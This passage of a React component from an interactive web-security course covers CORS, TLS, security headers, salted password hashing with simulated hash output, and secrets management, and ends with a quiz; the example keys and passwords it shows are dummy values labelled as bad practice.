                </motion.button>
              ))}
            </div>

            {/* Active attack details */}
            <AnimatePresence mode="wait">
              {activeAttack && (
                <motion.div
                  key={activeAttack}
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: 'auto' }}
                  exit={{ opacity: 0, height: 0 }}
                  className="overflow-hidden"
                >
                  {(() => {
                    const attack = attackScenarios.find(a => a.id === activeAttack)
                    if (!attack) return null
                    return (
                      <div className="bg-quest-bg rounded-xl p-6 mb-6 border border-white/10">
                        <div className="flex items-center justify-between mb-4">
                          <h3 className={`font-semibold ${attack.color}`}>{attack.name}</h3>
                          <div className="flex gap-2">
                            <button
                              onClick={() => setShowFixed(false)}
                              className={`px-3 py-1 rounded text-xs font-medium transition-all
                                ${!showFixed ? 'bg-red-500/20 text-red-400' : 'bg-quest-surface text-quest-muted'}`}
                            >
                              Vulnerable Code
                            </button>
                            <button
                              onClick={() => setShowFixed(true)}
                              className={`px-3 py-1 rounded text-xs font-medium transition-all
                                ${showFixed ? 'bg-green-500/20 text-green-400' : 'bg-quest-surface text-quest-muted'}`}
                            >
                              Fixed Code
                            </button>
                          </div>
                        </div>

                        <AnimatePresence mode="wait">
                          <motion.div
                            key={showFixed ? 'fixed' : 'vulnerable'}
                            initial={{ opacity: 0 }}
                            animate={{ opacity: 1 }}
                            exit={{ opacity: 0 }}
                          >
                            <div className={`rounded-lg p-4 font-mono text-xs leading-relaxed overflow-x-auto
                              ${showFixed ? 'bg-green-500/5 border border-green-500/20' : 'bg-red-500/5 border border-red-500/20'}`}>
                              <div className="flex items-center gap-2 mb-2">
                                {showFixed ? (
                                  <span className="text-green-400 text-xs font-sans font-semibold flex items-center gap-1">
                                    <CheckCircle size={14} /> Secure Implementation
                                  </span>
                                ) : (
                                  <span className="text-red-400 text-xs font-sans font-semibold flex items-center gap-1">
                                    <AlertTriangle size={14} /> Vulnerable Code
                                  </span>
                                )}
                              </div>
                              <pre className="text-quest-text whitespace-pre-wrap">
                                {showFixed ? attack.fixed : attack.vulnerable}
                              </pre>
                            </div>
                          </motion.div>
                        </AnimatePresence>

                        {/* Prevention checklist */}
                        <div className="mt-4 bg-quest-surface rounded-lg p-4">
                          <p className="text-xs font-semibold text-green-400 mb-2">Prevention Checklist</p>
                          <div className="space-y-1.5">
                            {attack.prevention.map((item, i) => (
                              <div key={i} className="flex items-start gap-2">
                                <CheckCircle size={14} className="text-green-400 mt-0.5 flex-shrink-0" />
                                <span className="text-xs text-quest-muted">{item}</span>
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>
                    )
                  })()}
                </motion.div>
              )}
            </AnimatePresence>

            {/* CORS explanation */}
            <div className="bg-quest-surface rounded-xl p-5 mb-6">
              <h3 className="text-sm font-semibold mb-3 flex items-center gap-2">
                <Shield size={16} className="text-sky-400" />
                CORS — Cross-Origin Resource Sharing
              </h3>
              <p className="text-xs text-quest-muted mb-4">
                Browsers block requests from one origin (domain) to another by default. CORS headers tell
                the browser which cross-origin requests are allowed.
              </p>

              <div className="bg-quest-bg rounded-lg p-4 mb-3">
                <div className="space-y-3">
                  <div>
                    <p className="text-xs font-semibold text-red-400 mb-1">Blocked (No CORS headers)</p>
                    <div className="flex items-center gap-2 text-xs font-mono">
                      <span className="px-2 py-1 rounded bg-sky-500/20 text-sky-400">app.com</span>
                      <span className="text-red-400">✗ →</span>
                      <span className="px-2 py-1 rounded bg-purple-500/20 text-purple-400">api.other.com</span>
                    </div>
                  </div>
                  <div>
                    <p className="text-xs font-semibold text-green-400 mb-1">Allowed (With CORS headers)</p>
                    <div className="flex items-center gap-2 text-xs font-mono">
                      <span className="px-2 py-1 rounded bg-sky-500/20 text-sky-400">app.com</span>
                      <span className="text-green-400">✓ →</span>
                      <span className="px-2 py-1 rounded bg-purple-500/20 text-purple-400">api.other.com</span>
                    </div>
                    <code className="block mt-2 text-[11px] text-quest-muted">
                      Access-Control-Allow-Origin: https://app.com
                    </code>
                  </div>
                </div>
              </div>

              <div className="bg-quest-bg rounded-lg p-3">
                <p className="text-xs font-semibold text-orange-400 mb-1">Common CORS Headers</p>
                <div className="space-y-1 text-[11px] font-mono text-quest-muted">
                  <p>Access-Control-Allow-Origin: https://app.com</p>
                  <p>Access-Control-Allow-Methods: GET, POST, PUT</p>
                  <p>Access-Control-Allow-Headers: Authorization, Content-Type</p>
                  <p>Access-Control-Allow-Credentials: true</p>
                </div>
              </div>
            </div>

            {/* HTTPS / TLS */}
            <div className="bg-quest-surface rounded-xl p-5 mb-6">
              <h3 className="text-sm font-semibold mb-3 flex items-center gap-2">
                <Lock size={16} className="text-green-400" />
                HTTPS/TLS — Encrypting Data in Transit
              </h3>
              <p className="text-xs text-quest-muted mb-4">
                Without TLS, all data between client and server travels as plaintext. Anyone on the same
                Wi-Fi network can read passwords, tokens, and private data.
              </p>

              <div className="grid md:grid-cols-2 gap-3">
                <div className="bg-quest-bg rounded-lg p-4 border border-red-500/20">
                  <p className="text-xs font-semibold text-red-400 mb-2">HTTP (Plaintext)</p>
                  <div className="space-y-1.5 text-[11px] font-mono text-quest-muted">
                    <p>GET /api/user HTTP/1.1</p>
                    <p>Authorization: Bearer sk_live_abc123</p>
                    <p className="text-red-400">← Attacker can read this!</p>
                  </div>
                </div>
                <div className="bg-quest-bg rounded-lg p-4 border border-green-500/20">
                  <p className="text-xs font-semibold text-green-400 mb-2">HTTPS (Encrypted)</p>
                  <div className="space-y-1.5 text-[11px] font-mono text-quest-muted">
                    <p>17 03 03 00 1c 9a 8f 2e</p>
                    <p>b4 c7 5d 38 a1 ee 90 47</p>
                    <p className="text-green-400">← Encrypted gibberish</p>
                  </div>
                </div>
              </div>

              <div className="mt-4 bg-quest-bg rounded-lg p-3">
                <p className="text-xs font-semibold text-quest-text mb-2">TLS Handshake (Simplified)</p>
                <div className="flex items-center gap-2 flex-wrap text-[11px]">
                  {['Client Hello', 'Server Hello + Cert', 'Key Exchange', 'Encrypted Session'].map((step, i, arr) => (
                    <div key={i} className="flex items-center gap-2">
                      <span className="px-2 py-1 rounded bg-quest-surface text-quest-muted">{step}</span>
                      {i < arr.length - 1 && <span className="text-green-400">→</span>}
                    </div>
                  ))}
                </div>
              </div>
            </div>

            <DeepDive id="security-headers" title="Essential Security Headers" onRead={markDeepDiveRead}>
              <div className="space-y-3 text-sm text-quest-muted">
                <p>
                  <strong className="text-quest-text">Content-Security-Policy (CSP):</strong> Controls which scripts,
                  styles, and resources can load. Prevents XSS by blocking inline scripts and unauthorized sources.
                  Example: <code className="text-xs font-mono">script-src 'self' https://cdn.example.com</code>
                </p>
                <p>
                  <strong className="text-quest-text">Strict-Transport-Security (HSTS):</strong> Forces browsers to
                  always use HTTPS. Prevents downgrade attacks.
                  <code className="text-xs font-mono block mt-1">Strict-Transport-Security: max-age=31536000; includeSubDomains</code>
                </p>
                <p>
                  <strong className="text-quest-text">X-Content-Type-Options:</strong> Set to <code className="text-xs font-mono">nosniff</code> to
                  prevent browsers from MIME-type sniffing, which can turn non-executable responses into executable scripts.
                </p>
                <p>
                  <strong className="text-quest-text">X-Frame-Options:</strong> Controls whether your page can be embedded
                  in an iframe. Set to <code className="text-xs font-mono">DENY</code> or <code className="text-xs font-mono">SAMEORIGIN</code> to
                  prevent clickjacking attacks.
                </p>
              </div>
            </DeepDive>

            <div className="flex justify-between mt-6">
              <button onClick={() => setCurrentSection(1)} className="btn-secondary flex items-center gap-2">
                <ChevronUp size={18} className="rotate-[-90deg]" />
                Back
              </button>
              <button onClick={() => setCurrentSection(3)} className="btn-primary flex items-center gap-2">
                Password Security
                <Lock size={18} />
              </button>
            </div>
          </div>
        </motion.div>
      )}

      {/* ═══════════════════ SECTION 3: PASSWORD SECURITY ═══════════════════ */}
      {currentSection === 3 && (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
          <div className="concept-card">
            <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Lock className="text-red-400" />
              Password Hashing — Never Store Plaintext
            </h2>

            <p className="text-quest-muted mb-6">
              The #1 rule of password security: <strong className="text-red-400">never store passwords in plaintext</strong>.
              If your database is breached, attackers should get useless hashes, not actual passwords.
              Type a password below to see the difference.
            </p>

            {/* Password input */}
            <div className="bg-quest-bg rounded-xl p-6 mb-6">
              <div className="flex items-center gap-3 mb-6">
                <div className="relative flex-1">
                  <input
                    type={showPlaintext ? 'text' : 'password'}
                    value={passwordInput}
                    onChange={e => setPasswordInput(e.target.value)}
                    placeholder="Type a password..."
                    className="w-full bg-quest-surface rounded-lg px-4 py-3 pr-10 text-sm font-mono text-quest-text border border-white/10 focus:border-sky-500/50 focus:outline-none transition-colors"
                  />
                  <button
                    onClick={() => setShowPlaintext(!showPlaintext)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-quest-muted hover:text-quest-text transition-colors"
                  >
                    {showPlaintext ? <Eye size={16} /> : <EyeOff size={16} />}
                  </button>
                </div>
              </div>

              {/* Three storage approaches */}
              <div className="space-y-4">
                {/* Plaintext */}
                <div className="bg-red-500/5 border border-red-500/20 rounded-lg p-4">
                  <div className="flex items-center gap-2 mb-2">
                    <Unlock size={16} className="text-red-400" />
                    <p className="text-xs font-semibold text-red-400">1. Plaintext (NEVER DO THIS)</p>
                  </div>
                  <div className="font-mono text-sm bg-quest-surface rounded px-3 py-2 text-quest-text">
                    password: "{passwordInput}"
                  </div>
                  <p className="text-[11px] text-red-400/70 mt-2">
                    If the database leaks, every password is immediately visible. This is what happened to Adobe in 2013.
                  </p>
                </div>

                {/* Hashed only */}
                <div className="bg-yellow-500/5 border border-yellow-500/20 rounded-lg p-4">
                  <div className="flex items-center gap-2 mb-2">
                    <Lock size={16} className="text-yellow-400" />
                    <p className="text-xs font-semibold text-yellow-400">2. Hashed (Better, but vulnerable to rainbow tables)</p>
                  </div>
                  <div className="font-mono text-sm bg-quest-surface rounded px-3 py-2 text-quest-text break-all">
                    password: "{fakeHash(passwordInput)}"
                  </div>
                  <p className="text-[11px] text-yellow-400/70 mt-2">
                    Two users with the same password get the same hash. Attackers pre-compute hashes
                    for common passwords (rainbow tables) and look up matches.
                  </p>
                </div>

                {/* Salted + Hashed */}
                <div className="bg-green-500/5 border border-green-500/20 rounded-lg p-4">
                  <div className="flex items-center gap-2 mb-2">
                    <Shield size={16} className="text-green-400" />
                    <p className="text-xs font-semibold text-green-400">3. Salted + Hashed (Best practice)</p>
                  </div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-[11px] text-quest-muted">Salt:</span>
                    <code className="font-mono text-xs text-sky-400 bg-quest-surface px-2 py-0.5 rounded">{hashSalt}</code>
                    <button
                      onClick={regenerateSalt}
                      className="text-[11px] text-sky-400 hover:text-sky-300 transition-colors underline"
                    >
                      regenerate
                    </button>
                  </div>
                  <div className="font-mono text-sm bg-quest-surface rounded px-3 py-2 text-quest-text break-all">
                    password: "{fakeSaltedHash(passwordInput, hashSalt)}"
                  </div>
                  <p className="text-[11px] text-green-400/70 mt-2">
                    A unique random salt is generated per user. Even identical passwords produce different hashes.
                    Rainbow tables are useless. Use bcrypt, scrypt, or Argon2.
                  </p>
                </div>
              </div>

              {/* Same password, different salts demonstration */}
              <div className="mt-6 bg-quest-surface rounded-lg p-4">
                <p className="text-xs font-semibold text-quest-text mb-3">
                  Same password "{passwordInput}", different salts:
                </p>
                <div className="space-y-2">
                  {['xK9mPq2v', 'Rj7nWs4a', 'bL5cYt8e'].map(salt => (
                    <div key={salt} className="flex items-start gap-3 text-[11px] font-mono">
                      <span className="text-sky-400 flex-shrink-0 w-20">salt: {salt}</span>
                      <span className="text-quest-muted break-all">{fakeSaltedHash(passwordInput, salt)}</span>
                    </div>
                  ))}
                </div>
                <p className="text-[11px] text-quest-muted mt-3">
                  All different hashes for the same password. An attacker cannot pre-compute a table
                  that works for all users.
                </p>
              </div>
            </div>

            {/* Hashing algorithm comparison */}
            <div className="bg-quest-surface rounded-xl p-5 mb-6">
              <h3 className="text-sm font-semibold mb-3">Password Hashing Algorithms</h3>
              <div className="overflow-x-auto">
                <table className="w-full text-xs">
                  <thead>
                    <tr className="border-b border-white/10">
                      <th className="text-left py-2 px-3 text-quest-muted font-medium">Algorithm</th>
                      <th className="text-left py-2 px-3 text-quest-muted font-medium">Status</th>
                      <th className="text-left py-2 px-3 text-quest-muted font-medium">Speed</th>
                      <th className="text-left py-2 px-3 text-quest-muted font-medium">Notes</th>
                    </tr>
                  </thead>
                  <tbody>
                    {[
                      { name: 'MD5', status: 'Broken', statusColor: 'text-red-400', speed: 'Very Fast', notes: 'Never use for passwords. Collisions found.' },
                      { name: 'SHA-256', status: 'Not Ideal', statusColor: 'text-yellow-400', speed: 'Fast', notes: 'Good for checksums, too fast for passwords.' },
                      { name: 'bcrypt', status: 'Recommended', statusColor: 'text-green-400', speed: 'Slow (tunable)', notes: 'Industry standard. Cost factor adjustable.' },
                      { name: 'scrypt', status: 'Recommended', statusColor: 'text-green-400', speed: 'Slow + memory-hard', notes: 'Resists GPU attacks with memory requirements.' },
                      { name: 'Argon2', status: 'Best', statusColor: 'text-green-400', speed: 'Slow + memory-hard', notes: 'Winner of Password Hashing Competition (2015).' },
                    ].map(algo => (
                      <tr key={algo.name} className="border-b border-white/5">
                        <td className="py-2 px-3 font-medium font-mono text-quest-text">{algo.name}</td>
                        <td className={`py-2 px-3 ${algo.statusColor} font-medium`}>{algo.status}</td>
                        <td className="py-2 px-3 text-quest-muted">{algo.speed}</td>
                        <td className="py-2 px-3 text-quest-muted">{algo.notes}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            <DeepDive id="password-best-practices" title="Modern Password Best Practices" onRead={markDeepDiveRead}>
              <div className="space-y-3 text-sm text-quest-muted">
                <p>
                  <strong className="text-quest-text">Why Slow is Good:</strong> For password hashing, speed is the enemy.
                  A fast hash (SHA-256) lets attackers try billions of guesses per second on a GPU. bcrypt and
                  Argon2 are deliberately slow — taking ~100ms per hash — making brute force impractical.
                </p>
                <p>
                  <strong className="text-quest-text">Work Factors:</strong> bcrypt has a "cost" parameter (typically 10-12).
                  Each increment doubles the time. Cost 10 ≈ 100ms. Cost 12 ≈ 400ms. Increase the cost factor over time
                  as hardware gets faster. Re-hash on next login.
                </p>
                <p>
                  <strong className="text-quest-text">Passwordless Alternatives:</strong> WebAuthn/passkeys, magic links,
                  and OAuth are increasingly preferred over passwords entirely. No password means nothing to breach.
                  Apple, Google, and Microsoft are all pushing passkeys.
                </p>
                <p>
                  <strong className="text-quest-text">Multi-Factor Authentication (MFA):</strong> Even with perfect
                  password hashing, stolen credentials from phishing remain a threat. TOTP (Time-based One-Time Password)
                  or hardware keys (YubiKey, WebAuthn) add a critical second layer.
                </p>
              </div>
            </DeepDive>

            {/* Key management note */}
            <div className="bg-quest-surface rounded-xl p-5 mb-6">
              <h3 className="text-sm font-semibold mb-3 flex items-center gap-2">
                <Key size={16} className="text-yellow-400" />
                Secrets Management
              </h3>
              <p className="text-xs text-quest-muted mb-3">
                API keys, database passwords, JWT secrets — these must never appear in code or version control.
              </p>
              <div className="grid md:grid-cols-2 gap-3">
                <div className="bg-quest-bg rounded-lg p-3 border border-red-500/20">
                  <p className="text-xs font-semibold text-red-400 mb-2">Never Do This</p>
                  <div className="font-mono text-[11px] text-quest-muted space-y-1">
                    <p>const DB_PASSWORD = "hunter2"</p>
                    <p>const API_KEY = "sk_live_abc123"</p>
                    <p className="text-red-400">// Committed to git!</p>
                  </div>
                </div>
                <div className="bg-quest-bg rounded-lg p-3 border border-green-500/20">
                  <p className="text-xs font-semibold text-green-400 mb-2">Instead, Use</p>
                  <div className="font-mono text-[11px] text-quest-muted space-y-1">
                    <p>const DB_PASSWORD = process.env.DB_PASSWORD</p>
                    <p>// Use AWS Secrets Manager,</p>
                    <p>// HashiCorp Vault, or .env files</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex justify-between mt-6">
              <button onClick={() => setCurrentSection(2)} className="btn-secondary flex items-center gap-2">
                <ChevronUp size={18} className="rotate-[-90deg]" />
                Back
              </button>
              <button onClick={() => setCurrentSection(4)} className="btn-primary flex items-center gap-2">
                Take the Quiz
                <CheckCircle size={18} />
              </button>
            </div>
          </div>
        </motion.div>
      )}

      {/* ═══════════════════ SECTION 4: QUIZ ═══════════════════ */}
      {currentSection === 4 && (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
          <div className="concept-card">
            <h2 className="text-2xl font-bold mb-2 flex items-center gap-2">
              <CheckCircle className="text-red-400" />
              Knowledge Check
            </h2>
            <p className="text-quest-muted mb-6">
              Security is not a feature — it is a requirement. Let's verify your understanding of the fundamentals.
            </p>

            <div className="space-y-8">
              {quizQuestions.map((q, qIndex) => (
                <div key={q.id} className="bg-quest-bg rounded-lg p-6">
                  <p className="font-medium mb-4">{qIndex + 1}. {q.question}</p>
                  <div className="space-y-2">
                    {q.options.map(option => {
                      const isSelected = quizAnswers[q.id] === option.id
                      const showResult = quizSubmitted
                      const isCorrect = option.correct

                      return (
                        <button
                          key={option.id}
                          onClick={() => !quizSubmitted && setQuizAnswers(prev => ({ ...prev, [q.id]: option.id }))}
                          disabled={quizSubmitted}
                          className={`w-full text-left p-3 rounded-lg border transition-all text-sm
                            ${isSelected
                              ? showResult
                                ? isCorrect ? 'border-quest-success bg-quest-success/10' : 'border-quest-danger bg-quest-danger/10'
                                : 'border-red-500 bg-red-500/10'
                              : showResult && isCorrect
                                ? 'border-quest-success bg-quest-success/10'
                                : 'border-white/10 hover:border-white/30'
                            }`}
                        >
                          {option.text}
                        </button>
                      )
                    })}
                  </div>
                </div>
              ))}
            </div>

            {!quizSubmitted ? (
              <button
                onClick={handleQuizSubmit}
                disabled={Object.keys(quizAnswers).length < quizQuestions.length}
                className="btn-primary w-full mt-6 disabled:opacity-50"
              >
                Submit Answers
              </button>
            ) : (
              <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="mt-6 bg-quest-success/10 border border-quest-success/30 rounded-lg p-6 text-center"
              >
                <Shield size={48} className="mx-auto text-quest-success mb-4" />
                <h3 className="text-xl font-bold mb-2">Level 24 Complete!</h3>
                <p className="text-quest-muted mb-4">
                  You now understand OAuth 2.0 flows, JWT structure, common attack vectors (XSS, CSRF, SQL Injection),
                  password hashing, CORS, HTTPS/TLS, and access control models. Your systems are locked down.
                </p>
                <p className="text-sm text-red-400">
                  The breach will never happen again. You hold the lock and the key.
                </p>
              </motion.div>
            )}
          </div>
        </motion.div>
      )}
    </div>
  )
}
